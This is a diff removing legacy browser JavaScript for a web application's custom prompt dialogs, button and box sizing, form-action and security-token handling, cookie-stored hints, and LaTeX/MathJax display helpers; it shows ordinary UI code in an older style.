-            + "</nobr></td></tr><tr  style=\"padding:1px 1px 0px 1px;background-color:" + pbgcolor + ";font-family:" + myfontname +  ";\"><td colspan=2 align=left valign=top style=\"padding:1px 1px 0px 1px;background-color:" + pbgcolor + ";font-family:" + myfontname +  ";color:black\">";
-    var lblyes = "Yes";
-    var lblno = "No";
-    var lblok = "Proceed";
-    var lblcan = "Cancel";
-    if (typeof (textmsg) != 'undefined')
-    {
-        lblno = textmsg[849];
-        lblyes = textmsg[848];
-        lblok = textmsg[66];
-        lblcan = textmsg[18];
-    }
-
-    if (func != null)
-    {
-        if (dfv == null)
-        {
-            promptwin0.innerHTML = head + ((het < 110) ? '<nobr>' : '') + str
-                    + "</td></tr><tr  style=\"padding:1px 1px 0px 1px;background-color:" + pbgcolor + ";font-family:" + myfontname +  ";\"><td align=center colspan=2><table  cellpadding=3 align=center><tr><td align=center><input name=b1 type=button class=OrangeButton style=" + bdim + " value=\"" + lblyes + "\" onclick=\"takeuserinputyn(true)\"><input name=b2 type=button class=GreenButton style=" + bdim + " value=\"" + lblno + "\" onclick=\"takeuserinputyn(false)\"></td></tr></table></td></tr></table>" + round2;
-        }
-        else
-        {
-            promptwin0.innerHTML = head + str
-                    + "</td></tr><tr  style=\"padding:1px 1px 0px 1px;background-color:" + pbgcolor + ";font-family:" + myfontname +  ";\"><td align=center colspan=2><table cellpadding=3 align=center><tr><td align=center><input id=promptinput style=\"width:" + (len) + "px;border:1px #505050 solid;border-radius:3px\"  value=\"" + dfv.replace(/"/g, '\\"') + "\" onkeypress=\"return takeuserinputenter(event,this)\"><br><table><tr><td></td></tr></table><input name=b1 type=button class=GreenButton style=" + bdim + " value=\"" + lblok + "\" onclick=\"takeuserinput(this)\"><input name=b2 type=button class=GreenButton style=" + bdim + " value=\"" + lblcan + "\" onclick=\"closeprompt()\"></td></tr></table></td></tr></table>" + round2;
-        }
-    }
-    else
-    {
-        promptwin0.innerHTML = head + str + "</td></tr></table>" + round20;
-
-    }
-
-    document.body.appendChild(promptwin0);
-
-    if (iamgoing)
-    {
-        var heit = promptwin0.offsetHeight+20;
-        if (heit < 130)
-            heit = 130;
-        promptwin0.style.height = "1px";
-        if (het < 10) het = 0;
-        promptwin0.style.top = (het-10) + "px";
-        keepgoing = true;
-        risedown(1, 0, het - 10, heit);
-    }
-    else
-    {
-        promptwinfit(mypromptid);
-
-
-        var left = Math.floor(wd - promptwin0.offsetWidth) / 2;
-        if (left < 0)
-            left = 0;
-        left += thescrolll;
-        var top = het - promptwin0.offsetHeight;
-        top = Math.floor(top / 2);
-        if (top < 0)
-            top = 0;
-      
-        top += thescrollt;
-        if (top < 0)
-            top = 0;
-        promptwin0.style.left = left + "px";
-        promptwin0.style.top = top + "px";
-    }
-    promptwin0.style.zIndex = 20;
-
-    var titlebar = promptwin0.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[0];
-    if (typeof (Drag) != 'undefined')
-        Drag.init(titlebar, promptwin0);
-    if (titlebar!=null)
-        titlebar.cells[0].style.width = (picwidth + 2) + 'px';
-
-    unifonts(promptwin0, myfontname);
-     if (!iamgoing)
-         document.getElementById('myprompthead').style.cursor = 'move';
-    if (mypromptid=='myprompt')
-        promptwin = promptwin0;
-    var zi = 0;
-    for (var i=0; i < document.body.childNodes.length; i++)
-        if ( typeof(document.body.childNodes[i].style)!='undefined' && document.body.childNodes[i].style!=null &&
-             typeof(document.body.childNodes[i].style.zIndex) != 'undefined')
-     {
-         var xx = parseInt(document.body.childNodes[i].style.zIndex);
-         if (xx > zi) zi = xx;
-     }
-    zi++;
-    promptwin0.style.zIndex = ''+zi;
-    return promptwin0;
-   
-}
-
-function setpromptbutlabel(s0, s1)
-{
-    var x = promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[2].cells[0].getElementsByTagName('table')[0].rows[0].cells[0];
-    if (s0!=null) x.getElementsByTagName('input')[0].value = s0;
-    if (s1!=null) x.getElementsByTagName('input')[1].value = s1;
-}
-
-function setRoundedWidth(adiv, w)
-{
-    if (adiv == null)
-        return;
-    var t = adiv.getElementsByTagName('table')[0];
-    if (t.rows.length < 3 || t.rows[2].cells.length < 2 ||  t.rows[2].cells[1].getElementsByTagName('div')==null)
-    {
-        return;
-    }
-    var r = t.rows[2].cells[1].getElementsByTagName('div')[0];
-    {
-        r.style.width = '1px';
-        adiv.style.width = (10 + w) + 'px';
-        r.style.width = w + 'px';
-    }
-}
-function setRoundedHeight(adiv, h)
-{
-    if (adiv == null)
-        return;
-    if (adiv.getElementsByTagName)
-        var r = adiv.getElementsByTagName('table');
-    if (r == null)
-        return;
-    var u = r[0].rows[1];
-    if (u != null)
-        r = u.cells[2];
-    if (r == null)
-        return;
-    u = r.getElementsByTagName('div');
-    if (u == null)
-        return;
-    r = u[0];
-    if (r != null)
-    {
-        r.style.height = '1px';
-        adiv.style.height = (2 + h) + 'px';
-        r.style.height = h + 'px';
-    }
-}
-
-function setRoundedSize(adiv, w, h)
-{
-    setRoundedWidth(adiv, w);
-    setRoundedHeight(adiv, h);
-}
-
-function promptsetwidth(w)
-{
-    var picwidth = 22;
-    setRoundedWidth(promptwin, w);
-    var titlebar = promptwin.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[0];
-    titlebar.cells[0].style.width = (picwidth + 2) + 'px';
-    titlebar.cells[1].style.width = (w - 2 - picwidth) + 'px';
-}
-function swappic(p)
-{
-    var x = p.src, y;
-    if (x.charAt(x.length - 5) == '1')
-        y = x.replace(/1\.png$/, '0.png');
-    else
-        y = x.replace(/0\.png$/, '1.png');
-    p.src = y;
-}
-function stopgoing()
-{
-    keepgoing = false;
-}
-
-function risedown(j, i, het, ht)
-{
-    if (keepgoing == false)
-        return;
-    if (j == 1)
-    {
-        if (i < ht)
-            i++;
-        else {
-            j = 0;
-        }
-    }
-    else if (j == 0)
-    {
-        i--;
-        if (i == 0)
-        {
-            j = -1;
-            i = ht;
-        }
-    }
-    else
-    {
-        if (i > 0)
-            i--;
-        if (i == 0)
-        {
-            keepgoing = false;
-            closeprompt();
-        }
-    }
-    if (keepgoing && promptwin != null && j != 0 && i > 0)
-    {
-        setRoundedHeight(promptwin, i);
-        promptwin.style.width = '300px';
-        promptwin.style.height = i + 'px';
-        if (het<i) het = i;
-        promptwin.style.top = (het - i) + "px";
-    }
-    if (i > 0 && keepgoing)
-        setTimeout("risedown(" + j + "," + i + "," + het + "," + ht + ")", 50);
-
-}
-function promptwinfit(mypromptid)
-{
-    if (mypromptid==null)
-        mypromptid = 'myprompt';
-    var promptwin1 = document.getElementById(mypromptid);
-    document.getElementById('myprompthead').style.cursor = 'move';
-    var div1 = promptwin1.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows[1].cells[0];
-    if (div1.childNodes != null && div1.childNodes.length > 0)
-    {
-        var maxw = 0, maxh = 0;
-        var hasbut = false;
-        for (var i = 0; i < div1.childNodes.length; i++)
-        {
-            if (div1.childNodes[i].offsetWidth > maxw)
-                maxw = div1.childNodes[i].offsetWidth;
-            if (div1.childNodes[i].offsetHeight > maxh)
-                maxh = div1.childNodes[i].offsetHeight;
-            if (hasbut == false && typeof (div1.childNodes[i].tagName) != 'undefined'
-                    && div1.childNodes[i].tagName.toLowerCase() == 'input'
-                    && typeof (div1.childNodes[i].type) != 'undefined'
-                    && div1.childNodes[i].type.toLowerCase() == 'button')
-                hasbut = true;
-
-        }
-        if (hasbut)
-            maxh += 30;
-
-        if (div1.offsetWidth < maxw+4)
-        {
-            div1.style.width = (maxw+4) + 'px';
-        }
-        if (div1.offsetHeight < maxh+4)
-            div1.style.height = (maxh+4) + 'px';
-    }
-    /*((dfv!=null)?4:0)) +  ((func!=null)?30:0) */
-    //if (div1.offsetWidth != 0)
-    //   promptwin.style.width = (div1.offsetWidth + 18) + "px";
-    //else
-    //   promptwin.style.width = (div1.clientWidth + 18) + "px";
-
-    if (div1.offsetHeight != 0)
-        setRoundedHeight(promptwin1, div1.offsetHeight + 38 + (promptwin1.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows.length > 2 ? 36 : 0));
-    else
-        setRoundedHeight(promptwin1, div1.clientHeight + 38 + (promptwin1.getElementsByTagName('table')[0].rows[1].cells[1].getElementsByTagName('table')[0].rows.length > 2 ? 36 : 0)) + "px";
-    var wd = thispagewidth();
-    var het = thispageheight();
-    if (promptwin1.offsetHeight > het - 4)
-        promptwin1.style.top = '0px';
-    if (promptwin1.offsetHeight < 120)
-        setRoundedHeight(promptwin1, 120);
-    if (promptwin1.offsetWidth > wd - 4)
-        promptwin1.style.left = '0px';
-    var mw = 250;
-    if (250 > thispagewidth() - 10)
-        mw = thispagewidth() - 10;
-    if (promptwin1.offsetWidth < mw)
-        setRoundedWidth(promptwin1, mw);
-}
-
-function takeuserinput(btn)
-{
-    var v = btn.parentNode.childNodes[0].value;
-    closeprompt();
-    eval(promptfunc);
-}
-function takeuserinputenter(evt, tbx)
-{
-    var e = evt ? evt : window.event;
-    if (!e)
-        return true;
-    var key = 0;
-    if (e.keyCode) {
-        key = e.keyCode;
-    } // for moz/fb, if keyCode==0 use 'which'
-    else if (typeof (e.which) != 'undefined') {
-        key = e.which;
-    }
-    if (key == 13)
-    {
-        var v = tbx.value;
-        eval(promptfunc);
-        closeprompt();
-    }
-    return true;
-}
-function takeuserinputyn(v)
-{
-    closeprompt();
-    eval(promptfunc);
-}
-function closeprompt(mypromptid)
-{
-    if (mypromptid == null) mypromptid = 'myprompt';
-    var promptwin1 = document.getElementById(mypromptid);
-    if (promptwin1 != null && typeof (needtranslator) != 'undefined' && needtranslator && typeof(LaTexHTML) != 'undefined')
-    {
-        LaTexHTML.deformat(promptwin1);
-    }
-    if (promptwin1 != null)
-        document.body.removeChild(promptwin1);
-    if (mypromptid == 'myprompt')
-        promptwin = null;
-}
-
-function charwidthrate()
-{
-    var x = "";
-    if (typeof (document.characterSet) != 'undefined')
-        x = document.characterSet.toLowerCase();
-    else if (typeof (document.charset) != 'undefined')
-        x = document.charset.toLowerCase();
-    if (x == 'gb2312')
-        return 4.1;
-    return 4.5;
-}
-function resizebut(theform, fontsize, enforce)
-{
-    if (theform == null)
-        return;
-    var fntsize = 16;
-    if (typeof (fontsize) != 'undefined' && fontsize != null)
-        fntsize = fontsize;
-    else if (typeof (font_size) != 'undefined' && font_size != null)
-        fntsize = font_size;
-    var width = Math.ceil(fntsize * charwidthrate());
-    for (var j = 0; j < theform.elements.length; j++)
-    {
-        if (theform.elements[j].tagName.toLowerCase() == 'input'
-                && typeof (theform.elements[j].type) != 'undefined'
-                && (theform.elements[j].type.toLowerCase() == 'submit' ||
-                        theform.elements[j].type.toLowerCase() == 'reset' ||
-                        theform.elements[j].type.toLowerCase() == 'button')
-                )
-        {
-            if (enforce != null && enforce == '1')
-                theform.elements[j].style.overflow = "hidden";
-            else if (enforce == null || enforce == '0')
-                theform.elements[j].style.overflow = "visible";
-            else
-            {
-                theform.elements[j].style.overflow = "visible";
-                width = 2 * fntsize;
-            }
-            if (theform.elements[j].value.indexOf(">") < 0
-                    && theform.elements[j].value.indexOf("<") < 0)
-            {
-                if (theform.elements[j].offsetWidth < width
-                        || navigator.appName == 'Microsoft Internet Explorer')
-                    theform.elements[j].style.width = width + 'px';
-
-            }
-            //theform.elements[j].style.height = (fntsize + 6) + 'px';
-        }
-    }
-
-}
-
-
-function enforcebutwidth(theform, width)
-{
-    var again = false;
-    for (var j = 0; j < theform.elements.length; j++)
-    {
-        if (theform.elements[j].offsetWidth > width)
-        {
-            again = true;
-            theform.elements[j].value = theform.elements[j].value.replace(/.$/, '');
-            theform.elements[j].style.width = width + "px";
-            if (typeof (theform.elements[j].width) != 'undefined')
-                theform.elements[j].width = width;
-        }
-    }
-    return again;
-}
-
-function resizehelpbut(wind, fontsize)
-{
-
-    var fntsize = 16;
-    if (typeof (fontsize) != 'undefined' && fontsize != null)
-        fntsize = fontsize;
-    else if (typeof (font_size) != 'undefined' && font_size != null)
-        fntsize = font_size;
-    var buts = wind.document.getElementsByTagName("input");
-
-    for (var j = 0; j < buts.length; j++)
-    {
-        if (typeof buts[j].type != 'undefined' &&
-                buts[j].type == 'button' &&
-                buts[j].offsetWidth < fntsize * charwidthrate())
-            buts[j].style.width = "" + (fntsize * charwidthrate()) + "px";
-    }
-}
-
-function tailaction(s)
-{
-
-    var i = s.indexOf("?");
-    if (i == -1)
-        return s + "?1";
-    var j = i + 1;
-
-    while (j < s.length && s.charAt(j) <= '9' && s.charAt(j) >= '0')
-        j++;
-    var ans = s.substring(0, i + 1);
-    if (j == i + 1)
-    {
-        ans += "1&";
-    }
-    else
-    {
-        ans += "" + (parseInt(s.substring(i + 1, j)) + 1);
-    }
-    if (j < s.length)
-        ans += s.substring(j);
-    return ans;
-}
-
-function resumeFailed(win)
-{
-    win.onunload = function(){
-    setTimeout(failedformsubmit,500);
-   }
-}
-function formnewaction(fm, s)
-{
-    failedformsubmit = "document." + fm.name + ".submit();";
-    if (s == null)
-        fm.action = tailaction(fm.action);
-    else if (fm.action == s)
-        fm.action = tailaction(s);
-    else
-        fm.action = s;
-    var el = formselementbyname(fm, "securitytoken");
-
-    if (el == null)
-    {
-        el = document.createElement("input");
-        el.type = "hidden";
-        el.name = "securitytoken";
-        fm.appendChild(el);
-    }
-    if (typeof (securitytoken) != 'undefined')
-        el.value = securitytoken;
-    if (typeof(orgnum)!='undefined')
-    {
-        var e2 = formselementbyname(fm, "orgnum");
-
-        if (e2 == null)
-        {
-            e2 = document.createElement("input");
-            e2.type = "hidden";
-            e2.name = "orgnum";
-            fm.appendChild(e2);
-            if (typeof (orgnum) != 'undefined')
-                 e2.value = (orgnum%65536);
-             
-        }
-        e2.disabled = false;
-    }
-
-}
-
-function initialhintneed(i)
-{
-    var x = GetCookie("initialhint");
-
-    if (x == null)
-        return true;
-    return (x.indexOf("," + i + ",") < 0);
-}
-function initialhint(i, helpmsg)
-{
-    return "<table cellpadding=1 cellspacing=1><tr><td colspan=2>"
-            + ((helpmsg == null) ? textmsg[88] : helpmsg)
-            + "</td></tr><tr><td><input type=checkbox style=background-color:transparent onclick=\"javascript:initialhintset(" + i + ")\">"
-            + "</td><td>" + textmsg[872] + "</td></tr></table>";
-}
-function initialhintset(i)
-{
-    var x = GetCookie("initialhint");
-    if (x == null)
-        x = "," + i + ",";
-    else if (x.indexOf("," + i + ",") < 0)
-        x += i + ",";
-    else
-        return;
-
-    SetCookie("initialhint", x);
-}
-
-function newajax()
-{
-    var ajaxRequest = null;
-    try
-    {
-        ajaxRequest = new XMLHttpRequest();
-    } catch (e)
-    {
-        try
-        {
-            ajaxRequest = new ActiveXObject("Msxml2.XMLHTTP");
-        }
-        catch (e)
-        {
-            try
-            {
-                ajaxRequest = new ActiveXObject("Microsoft.XMLHTTP");
-            }
-            catch (e)
-            {
-                myprompt("Your browser has a problem. Please restart or update your browser ");
-            }
-        }
-    }
-    return ajaxRequest;
-}
-
-function textboxhint(txt, s, hint)
-{
-    if (s == 1)
-    {
-        if (txt.value == '')
-        {
-            if (hint == null)
-                txt.value = txt.name;
-            else
-                txt.value = hint;
-            txt.style.color = "#aaaaaa";
-        }
-    }
-    else
-    {
-        if (txt.style!=null)
-        {
-            var x = '#aaaaaa';
-            if (txt.style.color!=null)
-                x = txt.style.color.toString().toLowerCase().replace(/ /g, '');
-            if (x == '#aaaaaa' || x == 'rgb(170,170,170)')
-            {
-                txt.value = '';
-                txt.style.color = "#000000";
-            }
-        }
-    }
-}
-
-
-function caretPos(el)
-{
-    if (el == null) return 0;
-    if (document.selection)
-    {
-
-        var start = 0,
-                range = el.createTextRange(),
-                range2 = document.selection.createRange().duplicate(),
-                range2Bookmark = range2.getBookmark();
-        range.moveToBookmark(range2Bookmark);
-        while (range.moveStart('character', -1) != 0)
-        {
-            start++;
-        }
-        return start;
-    }
-    else if (el.selectionStart || el.selectionStart == '0')
-    {
-
-        return el.selectionStart;
-    }
-
-    return 0;
-
-}
-
-function mkstrike(ta, evt, orientation)
-{
-    if (needtochecksyntax == false)
-        return;
-    if (orientation == null)
-        orientation = 's';
-    var e = evt ? evt : window.event;
-    if (!e)
-        return true;
-    var key = 0;
-    if (e.keyCode) {
-        key = e.keyCode;
-    } // for moz/fb, if keyCode==0 use 'which'
-    else if (typeof (e.which) != 'undefined')
-    {
-        key = e.which;
-    }
-    if (key == 36 || key == 62)
-    {
-        var j = caretPos(ta);
-        var fmt = editingfmt;
-
-        if (editingfmt < 2)
-        {
-            if (j > 0)
-                fmt = guessFormat(ta.value.substring(0, j) + String.fromCharCode(key) + ta.value.substring(j));
-            else
-                fmt = guessFormat(String.fromCharCode(key) + ta.value.substring(j));
-            editingfmt = fmt;
-        }
-
-        if (fmt == 1 || fmt == 2 && needtranslator)
-        {
-            tabeingedited = ta;
-            showlatexonfly(orientation, fmt, key)
-        }
-    }
-    return true;
-}
-
-var circlenum = function(n,k)
-{
-    
-    var m = Math.round(n/2 + 3) ;
-    return "<div style=\"font-family:arial;font-weight:700;width:" + (2*m) + "px;height:" + (2*m)
-        + "px;border-radius:" + m + "px;font-size:" + n + "px;color:#ddcc11;line-height:" + (2*m) + "px;text-align:center;background-color:" + IBGCOLOR + "\">" 
-        + k + "</div>";
-  
-}
-var UpdateMath = function(TeX, y)
-{
-    var math = MathJax.Hub.getAllJax('MathOutput')[0];
-    var box = document.getElementById(y);
-    MathJax.Hub.queue.Push(["Text", math, "\\displaystyle{" + TeX + "}"]);
-}
-var addbr = function(x)
-{
-    var state = 0;
-    var y = '';
-    x = x.replace(/\r\n/g, '\n').replace(/\r/g, '\n');
-    
-    for (var j=0; j < x.length; j++)
-    {
-       if (x.charAt(j) == '$')
-       {
-           state = 1-state;
-           y += '$';
-       }
-       else if (x.charAt(j) == '\n')
-       {
-           if (state == 0)
-               y += '<br>';
-           else
-               y += '\n';
-       }
-       else
-           y += x.charAt(j);
-
-    }
-    return y;
-}
-
-
-
-var formatstr0 = function(x, f)
-{
-    if (x == null)   return null;
-    if (f==null || ''+f != '0' && ''+f !='1' && ''+f !='2') 
-    {
-        if (typeof(guessFormat) != 'undefined')
-           f = ''+guessFormat(x);
-        else
-           f = '0';
-    }
-    if (''+f == '0' )
-    {
-        var ispre = '<pre style="display:inline;margin:0px 0px 0px 0px;font-family:inherit;font-size:inherit;font-weight:inherit">';
-        var ispre1 = '</pre>';
-        var xs = x.replace(/\r\n/g,'\n').replace(/\r/g,'\n').split(/\n/);
-        for (var j=0; j < xs.length; j++)
-        if (xs[j].length > 70)
-        {
-            ispre = '';
-            ispre1 = '';
-            break;
-        }
-        if (ispre == '')
-            x =   x.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\r\n/g, '<br>').replace(/[\r|\n]/g, '<br>') ;
-        else 
-            x = ispre +  x.replace(/</g, '&lt;').replace(/>/g, '&gt;')  + ispre1;
-        
-    }
-    else if (''+f == '2' )
-    {
-        if (typeof (needtranslator) != 'undefined')
-            needtranslator = true;
-        
-        return  x.replace(/\n[ |\t|\r]*\n/g, '<br>');
-    }
-    var r = new RegExp(/<pre[^>]*>/ig);
-    var r1 = new RegExp(/<.pre>/ig);
-    var k = 0;
-    
-    var str = '';
-    while (k < x.length)
-    {
-        var m = r.exec(x.substring(k));
-        if (m != null) 
-        {
-            var j = m.index + k;
-            var out = x.substring(k,j);
-            var ins = m.toString(); 
-            k = j + ins.length; 
-        }
-        else
-        {
-            out = x.substring(k);
-            ins = '';
-            k = x.length;
-        }
-        var l = r1.exec(out);
-        if (l == null)
-        {
-            str += dol(out);
-        }
-        else
-        {
-            var ll = l.index;
-            str += out.substring(0,ll+6) + dol(out.substring(ll+6));
-        }
-        str += ins; 
-    }
-  
-    return str;
-}
-function dol(x)
-{
-    var str = "";
-    var k = 0;
-    while ( k < x.length )
-    {
-        var j = x.indexOf("$", k);
-        var out;
-        var ins = "";
-        if (j == -1)
-        {
-            out = x.substring(k);
-            k = x.length ;
-        }
-        else 
-        {
-             out = x.substring(k,j);
-             k = j+1;
-             ins = "$";
-        }
-        str +=  out; 
-        if (j == 0 || j > 1 && x.charAt(j-1) !='\\')
-            ins = "<pre style=\"display:inline;margin:0px 0px 0px 0px;font-family:inherit;font-size:inherit;font-weight:inherit\">&dollar;</pre>" ;
-        str += ins;
-
-    }
-    return str;
-}
-function setPpenedf(t)
-{
-    openedfileinframe1 = false;
-    showraw(2);
-    document.body.removeChild(t);
-
-}
-
-function addbreak(str,nora)
-{
-    if (str.indexOf('\n\t') >= 0 || str.indexOf('\r\t') >= 0) return str;
-    if (nora == null) nora = "[a-z]";
-    else nora = "[0-9]+";
-    var rorn = (str.indexOf("\n") < 0 && str.indexOf("\r") >= 0)?'\r':'\n';
-    var m = null;
-    var k = 0, l = 0, j;
-    var spt = null;
-    var langsep = textmsg[1332].replace(/\./,'').replace(/\]/,'').replace(/\)/,'').replace(/:/,'').replace(/\[/,'').replace(/\(/,'').replace(/\\/,'').replace(/(.)/g, "|$1") + "]";
-    
-    if (rorn == '\n')
-        spt = new RegExp("\n(" + nora + "[ |:|\\.|\\)|\\]" + langsep + ")", "ig");
-    else
-        spt = new RegExp("\r(" + nora + "[ |:|\\.|\\)|\\]" + langsep +")" , "ig");
-    str = str.replace(spt,   "@#@,@@,#$1");
-     
-    return str;
-}
-function addbreak1(str)
-{
-    return str.replace(/@#@,@@,#/g, '<br>');
-}
-
-function openproper(s,x,t)
-{
-    if (window!=parent&&parent.parent.frames.length>1 && parent.parent.frames[0]==window.parent && typeof(ResizeUploaded) != 'undefined')
-    {
-        s = ResizeUploaded.goodopenurl(s,false);
-
-        window.open(s,parent.parent.frames[1].name);
-
-        openedfileinframe1 = true;
-    }
-    else if (window!=parent&&parent.frames.length>1 && parent.frames[0]==window  && typeof(ResizeUploaded) != 'undefined')
-    {
-        s = ResizeUploaded.goodopenurl(s,false);
-        if (s.indexOf('http') == 0)
-            window.open(s,'_blank');
-        else 
-            window.open(s,parent.frames[1].name);
-        openedfileinframe1 = true;
-        var btn = document.createElement('div');
-        btn.onclick =  function()
-        {
-            setPpenedf(this);
-        };
-        btn.id='closebtn';
-        btn.style.cssText = "position:fixed;left:" + (thispagewidth()-44) + 'px;top:56px;z-index:27;background-color:transparent;color:white;font-size:17px;width:22px;height:22px;line-height:22px;font-weight:bold;vertical-align:middle';
-        btn.innerHTML = "<img src=\"image/icon/smalls01.png\" style=\"margin:0px 0px 0px 0px;width:24px;height:24px;border-radius:12px\">";
-        document.body.appendChild(btn);
-
-    }
-    else
-        openpicorfile(s,x,t);
-}
-function mergeunderscore(x, y)
-{
-   if (x == null || y == null || y == '') return x;
-   var xs = (" " + x + " ").split(/__[_]+/);
-   var ys = y.replace(/\n/g,' \n').split(/\n/);
-   var ans = xs[0].substring(1);
-   for (var i=1; i < xs.length; i++)
-   {
-        var xx = '______________';
-        if (i <= ys.length)
-            xx = ys[i-1].replace(/ $/,'');
-        ans += '<span style="text-decoration: underline;font-weight:bold;color:purple">' + xx + '</span>' + xs[i];
-
-   }
-   return ans;
-}
-function openopen(str, ab)
-{
-    var xy = ab.split(/_/);
-    open(str,'_blank','width=' + xy[0] +",height=" + xy[1]);
-}
-function displaylatex(ele)
-{
-    //var fs = findFont(ele);
-    //var color = findColor(ele);
-    LaTexHTML.deformat(ele);
-    LaTexHTML.reformat(ele);
-}
-var findFont = function(n)
-{
-    if (n.style.fontSize != null)
-        return n.style.fontSize;
-    if (n.tagName.toLowerCase() == 'body')
-    {
-        if (typeof (font_size) != 'undefined')
-            return '' + font_size;
-        return '20';
-    }
-    return findFont(n.parentNode);
-}
-var findColor = function(n)
-{
-    if (n.style.color != null)
-        return n.style.color;
-    if (n.tagName.toLowerCase() == 'body')
-    {
-        return 'black';
-    }
-    return findColor(n.parentNode);
-}
-function turnoffdynamic()
-{
-    needtochecksyntax = false;
-}
-
-function showlatexonfly(orientation, fmt, key)
-{
-    var ta = tabeingedited;
-    var j = caretPos(ta), m = j - 1, l = -1;
-    if (j == 0)
-        return;
-
-    var str = '';
-    var ch = String.fromCharCode(key);
-    var str0 = '';
-    if (ch != '$')
-    {
-        str = ta.value.substring(0, j) + ch + ta.value.substring(j);
-        str0 = str;
-    }
-    else
-    {
-        str = ta.value.substring(0, j) + ch;
-        str0 = str;
-        var y = str.replace(/\\\$/g, '').replace(/\$\$[^\$]+\$\$/g, '').replace(/\$[^\$]+\$/g, '');
-
-        if (y.indexOf("$") >= 0)
-            return;
-        while (m >= 0 && str.charAt(m) == ch)
-            m--;
-        l = m + 1;
-        while (m >= 0 && str.charAt(m) != ch)
-            m--;
-        str = str.substring(m, l) + "$";
-
-        if (str == '$$')
-        {
-            return;
-        }
-    }
-    closeprompt();
-
-    var xx = "<br><input type=checkbox onclick=turnoffdynamic()>" + textmsg[872];
-
-    if (fmt == 2)
-        myprompt(checkh(str, true) + xx, null, null, textmsg[1047] + " LaTex");
-    else
-        myprompt(str + xx, null, null, textmsg[1047] + " HTML");
-    var xy = findPositionnoScrolling(ta);
-    if (orientation == 's')
-    {
-        promptwin.style.left = xy[0] + 'px';
-        if (xy[1] + ta.offsetHeight < 0) xy[1] = -ta.offsetHeight;
-        promptwin.style.top = (xy[1] + ta.offsetHeight) + 'px';
-        setRoundedWidth(promptwin, ta.offsetWidth);
-    }
-    else if (orientation == 'e')
-    {
-        promptwin.style.left = (xy[0] + ta.offsetWidth) + 'px';
-        if (xy[1] < 0) xy[1] = 0;
-        promptwin.style.top = (xy[1]) + 'px';
-    }
-    else if (orientation == 'n')
-    {
-        promptwin.style.left = xy[0] + 'px';
-        if (xy[1] <  promptwin.offsetHeight);
-        xy[1] = promptwin.offsetHeight;
-        promptwin.style.top = (xy[1] - promptwin.offsetHeight) + 'px';
-        setRoundedWidth(promptwin, ta.offsetWidth);
-    }
-    else if (orientation == 'w')
-    {
-        promptwin.style.left = (xy[0] - promptwin.offsetWidth) + 'px';
-        if (xy[1] < 0) xy[1] = 0;
-        promptwin.style.top = (xy[1]) + 'px';
-
-    }
-    else
-    {
-        str0 = str0.replace(/\r\n/g,'\n').replace(/\r/g,'\n');
-
-        var n = str0.replace(/[^\n]/g,'').length ;
-
-        var sty = ta.style;
-        var j = 24;
-
-        if (sty!=null && typeof(sty.lineHeight)!='undefined' && sty.lineHeight!=null)
-            j = parseInt(sty.lineHeight.replace(/[^0-9]/g,''));
-        if ( '' +j == 'NaN' && sty!=null && typeof(sty.fontSize)!='undefined')
-            j = Math.round(parseInt(sty.fontSize.replace(/[^0-9]/g,''))+ 4);
-        if ('' +j == 'NaN') j = 24;
-
-        var yy = xy[1] + (n*j) - promptwin.offsetHeight - 20;
-        var yy1 = yy;
-        if (yy < 0)
-            yy = 0;
-        if (yy > ta.offsetHeight - promptwin.style.offsetHeight)
-            yy = (ta.offsetHeight - promptwin.style.offsetHeight);
-        if (yy < 0)
-            yy = 0;
-        promptwin.style.top = yy + 'px';
-
-    }
-
-    if (fmt == 2)
-    {
-        displaylatex(promptwin);
-    }
-}
-
-
-function unifonts(x,f)
-{
-
-     if (f == null) f = myfontname;
-     if (x==null || x.nodeType==3 ||  typeof(x.className)!='undefined' && (''+x.className).toLowerCase().indexOf('math')==0) return;
-     if ((typeof(x.id)=='undefined'|| x.id==null || x.id.toString().indexOf('S_s')<0 && x.id.toString().indexOf('D_d')<0 ) && typeof(x.tagName)!='undefined'
-             &&  (x.tagName.toLowerCase() == 'div' || x.tagName.toLowerCase() == 'td'
-             || x.tagName.toLowerCase() == 'p' ||x.tagName.toLowerCase() == 'span'
-             || x.tagName.toLowerCase() == 'input' && x.type!='hidden' && x.type!='radio' ||x.tagName.toLowerCase() == 'select'
-             || x.tagName.toLowerCase() == 'textarea'|| x.tagName.toLowerCase() == 'body'
-            ))
-     {
-         x.style.fontFamily = f;
-         totaleles++;
-         if (x.tagName.toLowerCase() == 'select' ||  x.hasAttribute("onclick"))
-         {
-             x.style.cursor = 'pointer';
-         }
-     }
-     var y = x.childNodes;
-     if (y !=null && y.length>0)
-     for (var j=0; j < y.length; j++)
-     {
-        if (y[j]!=x) unifonts(y[j],f);
-     }
-}
-function homestr()
-{
-    if (typeof(IBGCOLOR)=='undefined') IBGCOLOR = "#007700";
-    if (typeof(BBGCOLOR)=='undefined') BBGCOLOR = "#00BBBB";
-    return "<div style=\"background:radial-gradient(farthest-side at 70% 65%," + BBGCOLOR + "," + IBGCOLOR + ");width:36px;height:36px;border-radius:18px;alignment:center;vertical-align:middle;line-height:36px\">"
-+"<table cellspacing=0 width=24 align=center><tr height=6><td colspan=7></td></tr><tr height=10><td colspan=7>"
-+"<div style=\"width:0px;height:0px;border-left:12px solid transparent;border-bottom:10px #fff solid;border-right:12px solid transparent;\"></div></td></tr>"
-+"<tr height=3><td width=3 rowspan=2></td><td width=5 style=\"background-color:#ffffff\"  rowspan=2></td><td width=5  rowspan=2></td><td width=4 style=\"background-color:#ffffff\"  rowspan=2></td><td width=5 ></td>"
-+"<td width=4 style=\"background-color:#ffffff\"  rowspan=2></td><td width=3 rowspan=2></td></tr><tr height=5><td style=\"background-color:#ffffff\" width=5></td></tr><tr height=12><td colspan=7></td></tr></table</div>";
- 
-}
-window.onload = function()
-{
-   if (typeof (needtranslator) != 'undefined' && needtranslator)
-    {
-        var script = document.createElement("script");
-        script.type = "text/javascript";
-        if (latexislocal)
-        {
-            script.src = "mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML";
-        }
-        else
-        {
-
-            script.src = "https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML";
-        }
-        document.getElementsByTagName("head")[0].appendChild(script);
-    }
